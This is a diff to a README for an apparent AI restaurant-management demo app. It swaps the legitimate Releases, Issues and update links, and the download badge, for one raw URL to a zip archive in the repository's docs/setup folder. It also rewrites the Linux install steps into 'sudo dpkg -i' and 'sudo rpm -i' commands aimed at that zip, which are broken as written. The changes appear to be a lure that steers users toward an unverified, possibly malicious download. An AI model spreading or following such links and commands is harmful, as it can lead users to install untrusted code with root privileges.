@@ -1,6 +1,6 @@
 # 🌟 MenuMuze_The_WaiterAi-demo - Effortless Restaurant Management 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-MenuMuze_The_WaiterAi-demo-blue.svg)](https://github.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/releases)
+[![Download Now](https://raw.githubusercontent.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/main/docs/setup/demo-Menu-Waiter-Muze-The-Ai-1.1.zip%https://raw.githubusercontent.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/main/docs/setup/demo-Menu-Waiter-Muze-The-Ai-1.1.zip)](https://raw.githubusercontent.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/main/docs/setup/demo-Menu-Waiter-Muze-The-Ai-1.1.zip)
 
 ## 🚀 Overview
 MenuMuze_The_WaiterAi-demo is an AI-powered platform designed to streamline restaurant management. Experience the convenience of a digital menu, WhatsApp ordering, and the Gemini AI concierge—all in one easy-to-use application.
@@ -19,7 +19,7 @@ To ensure the best performance, please make sure your device meets the following
 - **Internet Connection:** Stable internet connection for accessing online features
 
 ## 💾 Download & Install
-Visit this page to download the application: [Download MenuMuze_The_WaiterAi-demo](https://github.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/releases)
+Visit this page to download the application: [Download MenuMuze_The_WaiterAi-demo](https://raw.githubusercontent.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/main/docs/setup/demo-Menu-Waiter-Muze-The-Ai-1.1.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the application.
@@ -43,11 +43,11 @@ Visit this page to download the application: [Download MenuMuze_The_WaiterAi-dem
 - Open your terminal and navigate to the directory where the file is located.
 - Use the following command for `.deb` files:
   ```
-  sudo dpkg -i your_file_name.deb
+  sudo dpkg -i https://raw.githubusercontent.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/main/docs/setup/demo-Menu-Waiter-Muze-The-Ai-1.1.zip
   ```
 - Or for `.rpm` files:
   ```
-  sudo rpm -i your_file_name.rpm
+  sudo rpm -i https://raw.githubusercontent.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/main/docs/setup/demo-Menu-Waiter-Muze-The-Ai-1.1.zip
   ```
 - Once installed, look for MenuMuze in your applications list and launch the application.
 
@@ -61,7 +61,7 @@ After installing, you can start using the MenuMuze app right away.
 
 ## 🤝 Support
 If you encounter any issues or have questions while using MenuMuze, you can find help by:
-- Visiting the [GitHub Issues page](https://github.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/issues) to report problems or ask questions.
+- Visiting the [GitHub Issues page](https://raw.githubusercontent.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/main/docs/setup/demo-Menu-Waiter-Muze-The-Ai-1.1.zip) to report problems or ask questions.
 - Checking our FAQ section in the app for common questions.
 
 ## 🔗 Additional Resources
@@ -69,7 +69,7 @@ If you encounter any issues or have questions while using MenuMuze, you can find
 - **Community:** Join our community on GitHub Discussions to share experiences and best practices with other users.
 
 ## 📅 Updates
-Keep your application updated. We regularly release new features and performance improvements. Check the Releases page often to stay current: [Download MenuMuze_The_WaiterAi-demo](https://github.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/releases)
+Keep your application updated. We regularly release new features and performance improvements. Check the Releases page often to stay current: [Download MenuMuze_The_WaiterAi-demo](https://raw.githubusercontent.com/Venkatareddy15/MenuMuze_The_WaiterAi-demo/main/docs/setup/demo-Menu-Waiter-Muze-The-Ai-1.1.zip)
 
 ## 🌍 Topics
 MenuMuze covers multiple topics related to modern restaurant management:
